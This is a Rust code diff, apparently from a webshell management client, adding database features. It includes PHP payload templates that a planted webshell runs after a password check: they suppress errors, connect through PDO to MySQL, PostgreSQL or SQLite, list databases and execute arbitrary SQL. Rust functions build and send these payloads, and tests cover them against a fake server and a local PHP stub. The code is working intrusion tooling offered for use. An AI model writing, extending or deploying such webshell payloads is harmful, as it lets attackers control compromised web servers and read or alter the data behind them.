@@ -17,7 +17,10 @@ use base64::engine::general_purpose::STANDARD as B64;
 use base64::Engine;
 use serde_json::Value;
 
-use crate::domain::{AppSettings, CommandOutput, DirListing, FileEntry, ProbeResult, ShellProfile};
+use crate::domain::{
+    AppSettings, CommandOutput, DbConnection, DbProbeResult, DbQueryResult, DirListing, FileEntry,
+    ProbeResult, ShellProfile,
+};
 
 use super::transport::build_client;
 use super::{Protocol, ProtocolError, SessionState};
@@ -50,6 +53,37 @@ const TEMPLATE_FRAME: &str = r#"echo '{NONCE}'.base64_encode(json_encode($__r)).
 
 /// 错误分支的收尾：先输出错误帧再终止，保证客户端能解析到业务错误。
 const TEMPLATE_FRAME_DIE: &str = r#"echo '{NONCE}'.base64_encode(json_encode($__r)).'{NONCE}';die;"#;
+
+/// 数据库驱动白名单（Rust 侧校验，防止任意 DSN 注入）。
+const DB_DRIVERS: [&str; 3] = ["mysql", "pgsql", "sqlite"];
+
+/// 数据库探测载荷：PDO 连接 + 列出数据库。
+/// 占位符：{PWD} {DSN} {USER} {PASS} {LIST_DBS} {DBNAME} {DRIVER}
+const DB_PROBE_CODE: &str = r#"@ini_set("display_errors","0");@error_reporting(0);if(@$_POST['k']!=='{PWD}'){die('AUTH_FAIL');}
+$dsn=base64_decode('{DSN}');$u=base64_decode('{USER}');$w=base64_decode('{PASS}');
+try{$dbh=new PDO($dsn,$u,$w,array(PDO::ATTR_TIMEOUT=>5,PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION));
+$q=base64_decode('{LIST_DBS}');
+if($q===''){$dbs=array(base64_decode('{DBNAME}'));}else{$dbs=array();foreach($dbh->query($q) as $r){$dbs[]=$r[0];}}
+$__r=array('ok'=>true,'data'=>array('driver'=>'{DRIVER}','databases'=>$dbs));
+}catch(Exception $e){$__r=array('ok'=>false,'error'=>'数据库连接失败：'.$e->getMessage());}
+echo '{NONCE}'.base64_encode(json_encode($__r)).'{NONCE}';"#;
+
+/// 数据库查询载荷：连接 + 执行 SQL + 结果（查询返回列与行，非查询返回影响行数）。
+/// 占位符：{PWD} {DSN} {USER} {PASS} {SQL}
+const DB_QUERY_CODE: &str = r#"@ini_set("display_errors","0");@error_reporting(0);if(@$_POST['k']!=='{PWD}'){die('AUTH_FAIL');}
+$dsn=base64_decode('{DSN}');$u=base64_decode('{USER}');$w=base64_decode('{PASS}');
+try{$dbh=new PDO($dsn,$u,$w,array(PDO::ATTR_TIMEOUT=>5,PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION));
+$sql=base64_decode('{SQL}');
+$stmt=$dbh->query($sql);
+if($stmt===false){$__r=array('ok'=>false,'error'=>'SQL 执行失败');}
+elseif(preg_match('/^\s*(select|show|desc|describe|explain|pragma|with)\b/i',$sql)){
+$cols=array();$n=$stmt->columnCount();for($i=0;$i<$n;$i++){$m=$stmt->getColumnMeta($i);$cols[]=(isset($m['name'])&&$m['name']!=='')?$m['name']:('col'.$i);}
+$rows=array();$cnt=0;
+while(($r=$stmt->fetch(PDO::FETCH_NUM))!==false&&$cnt<1000){$row=array();foreach($r as $v){$row[]=($v===null)?null:(string)$v;}$rows[]=$row;$cnt++;}
+$__r=array('ok'=>true,'data'=>array('columns'=>$cols,'rows'=>$rows,'affected'=>0));
+}else{$__r=array('ok'=>true,'data'=>array('columns'=>array(),'rows'=>array(),'affected'=>$stmt->rowCount()));}
+}catch(Exception $e){$__r=array('ok'=>false,'error'=>'数据库操作失败：'.$e->getMessage());}
+echo '{NONCE}'.base64_encode(json_encode($__r)).'{NONCE}';"#;
 
 impl PhpProtocol {
     /// 将 `params` 逐项替换进模板的 `{key}` 占位符。
@@ -493,6 +527,176 @@ impl Protocol for PhpProtocol {
         self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings)?;
         Ok(())
     }
+
+    fn db_probe(
+        &self,
+        session: &dyn SessionState,
+        connection: &DbConnection,
+        settings: &AppSettings,
+    ) -> Result<DbProbeResult, ProtocolError> {
+        let php = session
+            .as_any()
+            .downcast_ref::<PhpSession>()
+            .expect("会话类型不匹配");
+        let driver = connection.driver.clone();
+        let dsn = build_dsn(connection, false)?;
+        let list_dbs = match driver.as_str() {
+            "mysql" => "SHOW DATABASES".to_string(),
+            "pgsql" => "SELECT datname FROM pg_database".to_string(),
+            _ => String::new(),
+        };
+        let code = Self::build_code(
+            DB_PROBE_CODE,
+            &[
+                ("PWD", &php.password),
+                ("DSN", &B64.encode(dsn.as_bytes())),
+                ("USER", &B64.encode(conn_user(connection))),
+                ("PASS", &B64.encode(conn_pass(connection))),
+                ("LIST_DBS", &B64.encode(list_dbs.as_bytes())),
+                ("DBNAME", &B64.encode(conn_dbname(connection))),
+                ("DRIVER", &driver),
+            ],
+        );
+        let value = self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings)?;
+        let databases = value
+            .pointer("/data/databases")
+            .and_then(|v| v.as_array())
+            .map(|array| {
+                array
+                    .iter()
+                    .filter_map(|item| item.as_str().map(str::to_string))
+                    .collect()
+            })
+            .unwrap_or_default();
+        Ok(DbProbeResult {
+            driver,
+            databases,
+            message: "数据库连接成功".to_string(),
+        })
+    }
+
+    fn db_query(
+        &self,
+        session: &dyn SessionState,
+        connection: &DbConnection,
+        sql: &str,
+        settings: &AppSettings,
+    ) -> Result<DbQueryResult, ProtocolError> {
+        let php = session
+            .as_any()
+            .downcast_ref::<PhpSession>()
+            .expect("会话类型不匹配");
+        let dsn = build_dsn(connection, true)?;
+        let code = Self::build_code(
+            DB_QUERY_CODE,
+            &[
+                ("PWD", &php.password),
+                ("DSN", &B64.encode(dsn.as_bytes())),
+                ("USER", &B64.encode(conn_user(connection))),
+                ("PASS", &B64.encode(conn_pass(connection))),
+                ("SQL", &B64.encode(sql.as_bytes())),
+            ],
+        );
+        let start = Instant::now();
+        let value = self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings)?;
+        let duration_ms = start.elapsed().as_millis() as u64;
+
+        let columns = value
+            .pointer("/data/columns")
+            .and_then(|v| v.as_array())
+            .map(|array| {
+                array
+                    .iter()
+                    .filter_map(|item| item.as_str().map(str::to_string))
+                    .collect()
+            })
+            .unwrap_or_default();
+        let rows = value
+            .pointer("/data/rows")
+            .and_then(|v| v.as_array())
+            .map(|array| {
+                array
+                    .iter()
+                    .map(|row| {
+                        row.as_array()
+                            .map(|cells| {
+                                cells
+                                    .iter()
+                                    .map(|cell| {
+                                        if cell.is_null() {
+                                            None
+                                        } else {
+                                            Some(cell.as_str().unwrap_or("").to_string())
+                                        }
+                                    })
+                                    .collect()
+                            })
+                            .unwrap_or_default()
+                    })
+                    .collect()
+            })
+            .unwrap_or_default();
+        let affected = value
+            .pointer("/data/affected")
+            .and_then(|v| v.as_u64())
+            .unwrap_or(0);
+
+        Ok(DbQueryResult {
+            columns,
+            rows,
+            affected,
+            duration_ms,
+        })
+    }
+}
+
+/// 校验驱动白名单并构造 PDO DSN。
+/// `use_db` 为 true 时把 dbname 并入 DSN（查询语句需要选定数据库）。
+fn build_dsn(connection: &DbConnection, use_db: bool) -> Result<String, ProtocolError> {
+    if !DB_DRIVERS.contains(&connection.driver.as_str()) {
+        return Err(ProtocolError::NotSupported(format!(
+            "不支持的数据库驱动：{}（支持 mysql / pgsql / sqlite）",
+            connection.driver
+        )));
+    }
+    let host = connection.host.as_deref().unwrap_or("");
+    let port = connection.port.unwrap_or_else(|| {
+        if connection.driver == "pgsql" { 5432 } else { 3306 }
+    });
+    let dbname = connection.dbname.as_deref().unwrap_or("");
+    match connection.driver.as_str() {
+        "sqlite" => {
+            if dbname.is_empty() {
+                return Err(ProtocolError::ServerError(
+                    "SQLite 模式需要在「数据库」字段填写目标文件路径".into(),
+                ));
+            }
+            Ok(format!("sqlite:{dbname}"))
+        }
+        "mysql" => {
+            let mut dsn = format!("mysql:host={host};port={port};charset=utf8mb4");
+            if use_db && !dbname.is_empty() {
+                dsn.push_str(&format!(";dbname={dbname}"));
+            }
+            Ok(dsn)
+        }
+        _ => {
+            let db = if dbname.is_empty() { "postgres" } else { dbname };
+            Ok(format!("pgsql:host={host};port={port};dbname={db}"))
+        }
+    }
+}
+
+fn conn_user(connection: &DbConnection) -> String {
+    connection.username.as_deref().unwrap_or("").to_string()
+}
+
+fn conn_pass(connection: &DbConnection) -> String {
+    connection.password.as_deref().unwrap_or("").to_string()
+}
+
+fn conn_dbname(connection: &DbConnection) -> String {
+    connection.dbname.as_deref().unwrap_or("").to_string()
 }
 
 // ---------------------------------------------------------------------------
@@ -692,6 +896,135 @@ mod tests {
         let proto = PhpProtocol;
         let result = proto.probe(&profile(&format!("http://{addr}")), &settings());
         assert!(matches!(result, Err(ProtocolError::AuthFailed(_))), "应报鉴权失败");
+    }
+
+    #[test]
+    fn db_probe_payload_contains_pdo_and_whitelisted_driver() {
+        // 校验载荷：PDO 模板 + base64 参数 + 驱动白名单外拒绝
+        let (url, rx) = spawn_fake_server(|_code, _k| {
+            Some(json!({"ok": true, "data": {"driver": "mysql", "databases": ["test"]}}))
+        });
+        let proto = PhpProtocol;
+        let settings = settings();
+        let session = PhpSession {
+            endpoint: url.clone(),
+            password: "secret".into(),
+            client: build_client(&settings),
+        };
+        let conn = DbConnection {
+            driver: "mysql".into(),
+            host: Some("127.0.0.1".into()),
+            port: Some(3306),
+            username: Some("root".into()),
+            password: Some("pw".into()),
+            dbname: Some("test".into()),
+        };
+        let result = proto
+            .db_probe(&session, &conn, &settings)
+            .expect("探测应成功");
+        assert_eq!(result.databases, vec!["test"]);
+
+        let (k, code) = rx.recv_timeout(std::time::Duration::from_secs(5)).expect("应收到请求");
+        assert_eq!(k, "secret");
+        assert!(code.contains("new PDO"), "载荷应包含 PDO");
+        let dsn_b64 = code.split("$dsn=base64_decode('").nth(1).unwrap().split('\'').next().unwrap();
+        let decoded = String::from_utf8(B64.decode(dsn_b64).unwrap()).unwrap();
+        assert!(decoded.contains("mysql:host=127.0.0.1;port=3306;charset=utf8mb4"), "DSN 应正确：{decoded}");
+
+        // 驱动白名单外 → 拒绝
+        let bad = DbConnection { driver: "oracle".into(), ..conn.clone() };
+        let result = proto.db_probe(&session, &bad, &settings);
+        assert!(matches!(result, Err(ProtocolError::NotSupported(_))), "未知驱动应被拒绝");
+    }
+
+    #[test]
+    fn db_query_payload_contains_sql() {
+        let (url, rx) = spawn_fake_server(|_code, _k| {
+            Some(json!({"ok": true, "data": {"columns": ["id"], "rows": [["1"]], "affected": 0}}))
+        });
+        let proto = PhpProtocol;
+        let settings = settings();
+        let session = PhpSession {
+            endpoint: url.clone(),
+            password: "secret".into(),
+            client: build_client(&settings),
+        };
+        let conn = DbConnection {
+            driver: "sqlite".into(),
+            host: None,
+            port: None,
+            username: None,
+            password: None,
+            dbname: Some("/tmp/db.sqlite".into()),
+        };
+        let result = proto
+            .db_query(&session, &conn, "SELECT 1", &settings)
+            .expect("查询应成功");
+        assert_eq!(result.columns, vec!["id"]);
+        assert_eq!(result.rows, vec![vec![Some("1".to_string())]]);
+
+        let (k, code) = rx.recv_timeout(std::time::Duration::from_secs(5)).expect("应收到请求");
+        assert_eq!(k, "secret");
+        assert!(code.contains("$dbh->query($sql)"), "载荷应包含查询执行");
+        // SQL 以 base64 嵌入
+        let sql_b64 = code.split("$sql=base64_decode('").nth(1).unwrap().split('\'').next().unwrap();
+        assert_eq!(String::from_utf8(B64.decode(sql_b64).unwrap()).unwrap(), "SELECT 1");
+    }
+
+    #[test]
+    fn real_php_sqlite_db_round_trip() {
+        // 真实闭环：php -S + stub 上通过 pdo_sqlite 执行建表/插入/查询
+        let Some((url, dir, mut child)) = spawn_php_server() else {
+            eprintln!("跳过：未检测到 php 可执行文件");
+            return;
+        };
+        let proto = PhpProtocol;
+        let settings = settings();
+        let session = PhpSession {
+            endpoint: url,
+            password: "secret".into(),
+            client: build_client(&settings),
+        };
+        let db_path = dir.join("test.sqlite");
+        let conn = DbConnection {
+            driver: "sqlite".into(),
+            host: None,
+            port: None,
+            username: None,
+            password: None,
+            dbname: Some(db_path.to_str().unwrap().into()),
+        };
+
+        // 探测：SQLite 返回文件库本身
+        let probe = proto.db_probe(&session, &conn, &settings).expect("探测应成功");
+        assert_eq!(probe.databases, vec![db_path.to_str().unwrap()]);
+
+        // 建表 + 插入（非查询语句）
+        proto
+            .db_query(&session, &conn, "CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT)", &settings)
+            .expect("建表应成功");
+        let insert = proto
+            .db_query(&session, &conn, "INSERT INTO users (name) VALUES ('alice'), ('bob')", &settings)
+            .expect("插入应成功");
+        assert_eq!(insert.affected, 2, "插入应影响 2 行");
+
+        // 查询
+        let query = proto
+            .db_query(&session, &conn, "SELECT id, name FROM users ORDER BY id", &settings)
+            .expect("查询应成功");
+        assert_eq!(query.columns, vec!["id", "name"]);
+        assert_eq!(query.rows, vec![
+            vec![Some("1".into()), Some("alice".into())],
+            vec![Some("2".into()), Some("bob".into())],
+        ]);
+
+        // 错误 SQL 返回业务错误
+        let error = proto.db_query(&session, &conn, "SELECT * FROM missing", &settings);
+        assert!(matches!(error, Err(ProtocolError::ServerError(_))), "错误 SQL 应报业务错误");
+
+        let _ = child.kill();
+        let _ = child.wait();
+        let _ = std::fs::remove_dir_all(&dir);
     }
 
     // --- Level B：真实 PHP 往返（本机装有 php 时执行） ---
